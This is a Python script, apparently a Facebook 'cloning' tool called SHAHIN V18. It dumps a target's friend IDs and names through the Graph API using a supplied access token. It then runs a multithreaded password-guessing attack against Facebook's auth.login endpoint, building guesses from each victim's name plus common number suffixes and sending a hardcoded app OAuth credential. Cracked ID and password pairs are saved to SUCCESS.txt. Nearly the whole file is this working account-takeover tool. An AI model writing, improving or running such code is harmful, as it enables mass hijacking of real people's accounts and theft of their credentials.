import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Colors
G = '\033[1;92m' # Green
Y = '\033[1;93m' # Yellow
W = '\033[1;97m' # White
S = '\033[1;96m' # Sky Blue

loop, oks = 0, []

def line():
    print(f'{S}╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸{W}')

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V18{W}''')
    line()
    print(f' {W}[{G}•{W}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {W}[{G}•{W}] FEATURE  : {G}DUMP + TARGETED CLONE')
    line()

def Main():
    logo()
    print(f' {G}[1]{W} DUMP UID FROM PUBLIC ID {S}(আইডি খুঁজে বের করা)')
    print(f' {G}[2]{W} START FILE CLONING {Y}(BEST FOR OK ID)')
    print(f' {G}[0]{W} EXIT')
    line()
    opt = input(f' {W}[{G}•{W}] CHOOSE : {G}')
    if opt == '1': dump_uid()
    elif opt == '2': file_clone()
    else: exit()

# --- UID DUMPER SYSTEM ---
def dump_uid():
    logo()
    print(f' {W}[{G}•{W}] Put Public ID (e.g 1000083...)')
    userid = input(f' {W}[{G}+] ID : {G}')
    token = input(f' {W}[{G}+] FB TOKEN : {G}') # You need an EAAB Token
    try:
        res = requests.get(f'https://graph.facebook.com/{userid}/friends?access_token={token}').json()
        with open('dump.txt', 'a') as f:
            for user in res['data']:
                f.write(user['id'] + '|' + user['name'] + '\n')
        print(f' {G}[√] Successfully Dumped {len(res["data"])} IDs')
        print(f' {W}[•] File Saved as: {Y}dump.txt')
        input(' [Enter to Back]'); Main()
    except:
        print(f' {R}[!] Invalid Token or ID!'); time.sleep(2); Main()

# --- CLONING SYSTEM ---
def file_clone():
    logo()
    print(f' {W}[{G}•{W}] Enter File Path {G}(e.g /sdcard/dump.txt)')
    file = input(f' {W}[{G}+] FILE : {G}')
    try:
        ids = open(file, 'r').read().splitlines()
    except:
        print(f' {R}File not found!'); time.sleep(2); Main()
    
    with ThreadPool(max_workers=35) as v18:
        logo()
        print(f' {W}[{G}•{W}] TOTAL TARGET : {len(ids)}')
        line()
        for user in ids:
            try:
                uid, name = user.split('|')[0], user.split('|')[1].lower()
                first = name.split(' ')[0]
                # নামের সাথে মিলানো স্মার্ট পাসওয়ার্ড যা ওল্ড আইডিতে বেশি কাজ করে
                pws = [name, first+'123', first+'1234', first+'12345', first+'786', '572737', '575757', '102030', '112233']
                v18.submit(engine_v18, uid, pws, len(ids))
            except: pass

def engine_v18(uid, pws, limit):
    global loop, oks
    ua = "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json', 'device_id': str(uuid.uuid4())}
        try:
            url = 'https://b-api.facebook.com/method/auth.login'
            res = session.post(url, data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{W}')
                oks.append(uid)
                open('SUCCESS.txt', 'a').write(uid+'|'+pw+'\n')
                break
        except: pass
    loop += 1
    sys.stdout.write(f'\r\r {W}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{W}'); sys.stdout.flush()

if __name__ == "__main__":
    Main()
